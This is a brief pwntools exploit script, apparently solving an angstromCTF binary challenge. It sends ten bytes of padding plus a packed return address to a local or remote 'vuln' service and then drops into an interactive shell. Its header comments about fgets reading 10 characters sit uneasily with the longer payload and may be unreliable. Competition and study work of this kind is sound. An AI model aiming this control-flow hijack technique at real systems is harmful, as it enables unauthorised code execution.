
#
#malloc allocates a buffer of 1024 bytes
#fgets reads 10 characters from stdin and stores them in buf
#
#
#


import sys
from pwn import *

def main():
    if len(sys.argv) == 1:
        s = process("./vuln")
    else:
        s = remote("shell.actf.co", 20700)

    s.recvuntil("Enter a string!")
    s.sendline("A" * 10 + p64(0x400767))
    s.interactive()

if __name__ == "__main__":
    main()